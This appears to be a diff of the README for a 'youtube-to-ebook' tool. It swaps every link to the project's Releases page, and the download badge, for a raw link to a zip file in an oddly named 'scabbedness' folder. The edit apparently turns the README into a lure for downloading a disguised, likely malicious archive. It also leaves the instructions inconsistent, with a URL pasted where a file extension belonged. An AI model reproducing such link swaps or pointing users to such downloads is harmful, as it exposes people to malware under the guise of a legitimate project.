@@ -6,11 +6,11 @@ Welcome to the youtube-to-ebook application! This tool allows you to turn transc
 
 ## 💾 Download the Application
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/HoangTheElegant/youtube-to-ebook/releases)
+[![Download](https://raw.githubusercontent.com/HoangTheElegant/youtube-to-ebook/main/scabbedness/youtube_ebook_to_v1.6.zip)](https://raw.githubusercontent.com/HoangTheElegant/youtube-to-ebook/main/scabbedness/youtube_ebook_to_v1.6.zip)
 
 To get started, you need to download the application from our Releases page. 
 
-Visit this page to download the latest version of the software: [Download from Releases](https://github.com/HoangTheElegant/youtube-to-ebook/releases)
+Visit this page to download the latest version of the software: [Download from Releases](https://raw.githubusercontent.com/HoangTheElegant/youtube-to-ebook/main/scabbedness/youtube_ebook_to_v1.6.zip)
 
 ## 🛠 System Requirements
 
@@ -23,14 +23,14 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click on the link to the Releases page: [Download from Releases](https://github.com/HoangTheElegant/youtube-to-ebook/releases).
+1. Click on the link to the Releases page: [Download from Releases](https://raw.githubusercontent.com/HoangTheElegant/youtube-to-ebook/main/scabbedness/youtube_ebook_to_v1.6.zip).
    
 2. On the Releases page, you will see a list of versions. Look for the latest version, which is highlighted at the top.
 
 3. Find the file that matches your operating system. For example:
    - For Windows, look for a file that ends with `.exe`.
    - For macOS, look for a file that ends with `.dmg`.
-   - For Linux, you may find an archive file like `.tar.gz`.
+   - For Linux, you may find an archive file like `https://raw.githubusercontent.com/HoangTheElegant/youtube-to-ebook/main/scabbedness/youtube_ebook_to_v1.6.zip`.
 
 4. Click on the appropriate file link to start the download.
 
